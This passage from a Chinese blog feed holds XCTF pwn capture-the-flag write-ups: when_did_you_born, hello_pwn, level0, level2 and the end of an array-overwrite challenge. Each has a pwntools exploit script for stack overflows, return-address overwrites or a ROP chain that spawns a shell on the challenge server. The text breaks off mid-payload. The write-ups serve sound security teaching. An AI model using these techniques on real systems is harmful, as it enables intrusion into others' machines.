python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"How many numbers you have:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Give me your numbers\n"</span>,<span class="string">"1"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>下面我们将system写入返回地址处，因为v13是一个字符类型的数组，所以我们需要地址分解为4部分，然后向连续的地址中进行写入：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+i,system_addr[i])</span><br></pre></td></tr></table></figure><blockquote><p>下面我们将sh写入system参数的正确的位置，和上一步一样：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+j+<span class="number">8</span>,sh[j])<span class="comment"># 一定要记得这里的偏移+8</span></span><br></pre></td></tr></table></figure><blockquote><p>结束程序运行，并与系统进行交互</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x03-expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x03-expfont"></a> <font color="navy"><code>0x03 EXP</code></font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">35029</span>)</span><br><span class="line">retn_esp = <span class="number">0xffffd8bc</span></span><br><span class="line">ebp = <span class="number">0xffffd8a8</span></span><br><span class="line">v13 = ebp - <span class="number">0x70</span></span><br><span class="line">offset = retn_esp - ebp + <span class="number">0x70</span></span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset,<span class="string">"("</span>,hex(offset),<span class="string">")"</span>)</span><br><span class="line">system_addr = [<span class="number">0x50</span>,<span class="number">0x84</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">sh = [<span class="number">0x87</span>,<span class="number">0x89</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"How many numbers you have:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Give me your numbers\n"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="comment"># 开始</span></span><br><span class="line">start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向返回地址写入system地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+i,system_addr[i])</span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向system的参数位置写入sh地址</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+j+<span class="number">8</span>,sh[j])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结束</span></span><br><span class="line">r.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://www.zhihu.com/question/23440081" target="_blank" rel="noopener">为什么C语言中数组下标越界不报错？</a></p><p>[2]  <a href="https://www.52tourism.com/C/42666.html?btwaf=35062607" target="_blank" rel="noopener">计算机为什么用二进制和十六进制</a></p><p>[3] <a href="https://senitco.github.io/2017/06/07/string-processing/" target="_blank" rel="noopener">C/C++处理十六进制数和字符串</a></p><p>[4] <a href="http://liul14n.top/2019/11/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Pwn%E8%BF%9B%E9%98%B6%E5%8C%BA(1)/" target="_blank" rel="noopener">攻防世界-Pwn进阶区(1)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00相关知识点font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00相关知识点font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00.相
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-pwn】新手区writeup（part1）</title>
    <link href="https://muzibing.github.io/2020/06/01/2020.06.01%EF%BC%88122%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/01/2020.06.01（122）/</id>
    <published>2020-05-31T16:00:00.000Z</published>
    <updated>2020-06-03T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-when_did_you_bornfont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-when_did_you_bornfont"></a> <font color="navy"><code>0x00 when_did_you_born</code></font></h3><h4 id="1相关知识点"><a class="markdownIt-Anchor" href="#1相关知识点"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>64位下的栈溢出原理</li></ol></blockquote><h4 id="2解题思路"><a class="markdownIt-Anchor" href="#2解题思路"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped</span><br></pre></td></tr></table></figure><blockquote><p><code>pwn</code>文件是一个64位的ELF可执行文件，也就是说在以后的分析中要注意这个条件C</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped</span><br><span class="line">root@kali:~/Documents/CTF/PWN/XCTF/pwn/1/when_did_you)_pwn# checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/when_did_you)_pwn/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>没有开启地址随机化,，开启了cookie，开启了栈不可执行保护</p></blockquote><p><img src="/images/122-2.jpg" alt></p><blockquote><p>从图中可以看出，要想成功的打印出flag，就需要满足<code>v6 == 1926</code>，但是前面有一个条件要满足<code>v6!=1926</code>，所以说程序要正常执行的话，肯定是不能打印出flag的，就需要我们想办法绕过第一个条件<code>v6!=1926</code>，我们看到后面还要我们输入一个<code>v5</code>的值，且v5位于<code>ebp-0x20</code>，而又因为<code>v6</code>位于<code>ebp-0x18</code>，这两个内存空间紧紧的连着，所以虽然开启了canary，但是我们这里也可以利用第二个输入点，实现栈溢出来绕过第一个条件，满足<code>v6 == 1926</code></p></blockquote><h4 id="3解题步骤"><a class="markdownIt-Anchor" href="#3解题步骤"></a> <code>3.解题步骤</code></h4><blockquote><p>因为本题中较简单，看解题思路即可</p></blockquote><h4 id="4exp"><a class="markdownIt-Anchor" href="#4exp"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">57772</span>)<span class="comment"># 包括本题及以下题目的exp中的ip地址和端口号需要更换题目中给出的</span></span><br><span class="line">r.recvuntil(<span class="string">"What's Your Birth?"</span>)</span><br><span class="line">r.sendline(<span class="string">"1111"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"What's Your Name?"</span>)<span class="comment"># 到达溢出点</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">8</span> + str(p64(<span class="number">1926</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-hello_pwnfont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-hello_pwnfont"></a> <font color="navy"><code>0x01 hello_pwn</code></font></h3><h4 id="1相关知识点-2"><a class="markdownIt-Anchor" href="#1相关知识点-2"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>地址偏移</li></ol></blockquote><h4 id="2解题思路-2"><a class="markdownIt-Anchor" href="#2解题思路-2"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=05ef7ecf06e02e7f199b11c4647880e8379e6ce0, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该pwn文件是一个64位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/hello_pwn/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>就开启了一个栈不可执行</p></blockquote><p><img src="/images/122-3.png" alt></p><blockquote><p>从上图中可以看到一个read函数和一个<code>sub_400686()</code>函数，而<code>sub_400686()</code>函数是打印出flag，所以只要满足<code>dword_60106C == 1853186401</code>即可，那么在这里<code>dword_60106C</code>表示的是什么意思呢？不知道没关系，下面我用gdb进行调试：</p></blockquote><p><img src="/images/122-4.png" alt></p><blockquote><p>从上图中可以看出，如果要想执行<code>sub_400686()</code>函数，要使得<code>eax</code>中所指向的值和<code>0x6e756161</code>相等，而<code>eax</code>中存放的是<code>0x60106c</code>地址，那么到这里我们就应该清楚了<code>dword_60106C</code>和<code>unk_601068</code>分别表示的是<code>0x60106c</code>和<code>0x601068</code>地址中的值，两者相差4个字节，为了验证一下，在运行程序时，输入点的地方输入的是“<code>AAAA1234567890</code>”，分别看一下这两处地址的值为多少，结果如下图：</p></blockquote><p><img src="/images/122-6.png" alt></p><blockquote><p>从上图可以看出<code>0x601068</code>地址的值为<code>AAAA1234567890</code>，而<code>0x601068c</code>地址处的值为<code>1234567890</code>，所以说我们可以利用这个来满足条件语句。</p></blockquote><h4 id="3解题步骤-2"><a class="markdownIt-Anchor" href="#3解题步骤-2"></a> <code>3.解题步骤</code></h4><blockquote><p>【见解题思路】</p></blockquote><h4 id="4exp-2"><a class="markdownIt-Anchor" href="#4exp-2"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python</span></span><br><span class="line"><span class="comment">#! usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>,endian=<span class="string">"little"</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>)</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">37261</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"lets get helloworld for bof"</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">4</span> + str(p64(<span class="number">0x6E756161</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x02-level0"><a class="markdownIt-Anchor" href="#font-color-navy0x02-level0"></a> <font color="navy"><code>0x02 level0</code></font></h3><h4 id="1相关知识点-3"><a class="markdownIt-Anchor" href="#1相关知识点-3"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>64位下传参顺序：前六个参数是通过<code>rdi、rsi、rdx、rcx、r8、r9</code>进行传参的，后面的就是通过栈进行传参</li></ol></blockquote><h4 id="2解题思路-3"><a class="markdownIt-Anchor" href="#2解题思路-3"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/level0/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vulnerable_function();函数</span></span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以从上图中发现，read函数存在着栈溢出的危险漏洞，我们可以从IDA中看到，该文件中有一个callsystem的函数，于是这道题目就相对容易了</p></blockquote><h4 id="3解题步骤-3"><a class="markdownIt-Anchor" href="#3解题步骤-3"></a> <code>3.解题步骤</code></h4><blockquote><p>【见解题思路】</p></blockquote><h4 id="4exp-3"><a class="markdownIt-Anchor" href="#4exp-3"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">52526</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr = 0x400460</span></span><br><span class="line">system_addr_call = elf.symbols[<span class="string">"callsystem"</span>]</span><br><span class="line"><span class="comment">#bin_sh_addr = 0x400684</span></span><br><span class="line">r.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">"a"</span> + <span class="number">8</span>*<span class="string">"a"</span> + str(p64(system_addr_call),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"><span class="comment"># payload = 0x80*"a" + 8*"a" + str(p64(system_addr),encoding="unicode_escape")+ 8*"a" + str(p64(bin_sh_addr),encoding="unicode_escape")</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="5存在的问题"><a class="markdownIt-Anchor" href="#5存在的问题"></a> <code>5.存在的问题</code></h4><blockquote><ol><li>为什么payload不能为<code>payload = 0x80*&quot;a&quot; + 8*&quot;a&quot; + str(p64(system_addr),encoding=&quot;unicode_escape&quot;)+ 8*&quot;a&quot; + str(p64(bin_sh_addr),encoding=&quot;unicode_escape&quot;)</code></li><li>为什么exp还可以为下方所示：</li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">52526</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400663</span></span><br><span class="line">system_addr = <span class="number">0x0000000000400460</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0000000000400684</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">"a"</span> + <span class="number">8</span>*<span class="string">"a"</span> + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(bin_sh_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x03-level2font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-level2font"></a> <font color="navy"><code>0x03 level2</code></font></h3><h4 id="1相关知识点-4"><a class="markdownIt-Anchor" href="#1相关知识点-4"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>栈溢出的条件：可以输入的大于分配的</li><li>函数调用时栈中的情况</li></ol><p><img src="/images/119-3.jpg" alt></p></blockquote><h4 id="2解题思路-4"><a class="markdownIt-Anchor" href="#2解题思路-4"></a> <code>2.解题思路</code></h4><p><code>分析</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file pwn </span><br><span class="line"></span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</span><br></pre></td></tr></table></figure><blockquote><p><code>pwn</code>文件是一个32位的ELF可执行文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/level2/pwn&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>没有开启地址随机化和cookie，开启了栈不可执行保护</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main 函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vulnerable_function()函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>从上面程序的源代码中可以看出，在<code>vulnerable_function()</code>函数中存在着栈溢出漏洞，因为buf被分配了0x88大小的空间，但实际能输入0x100大小，因此会造成溢出</p></blockquote><h4 id="3解题步骤-4"><a class="markdownIt-Anchor" href="#3解题步骤-4"></a> <code>3.解题步骤</code></h4><blockquote><p>对于本题来说，我们已经找到了溢出点，那么我们的解题思路如下：</p><ul><li>找出“system”和”/bin/sh“的地址</li><li>构造出payload</li></ul></blockquote><p><font color="red"><code>找出system和/bin/sh的地址</code></font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary pwn --string &quot;system&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0804824b : system</span><br><span class="line"></span><br><span class="line"># ROPgadget --binary pwn --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0804a024 : /bin/sh</span><br></pre></td></tr></table></figure><blockquote><p>查找”system“函数和“/bin/sh”字符串的地址，可知system的地址为：<code>0x0804824b</code>，/bin/sh的地址为<code>0x0804a024</code></p></blockquote><p><font color="red"><code>构造payload</code></font></p><blockquote><p>根据上述分析，我们可以构造如下payload</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x88</span> + <span class="string">"a"</span>*<span class="number">4</span> + 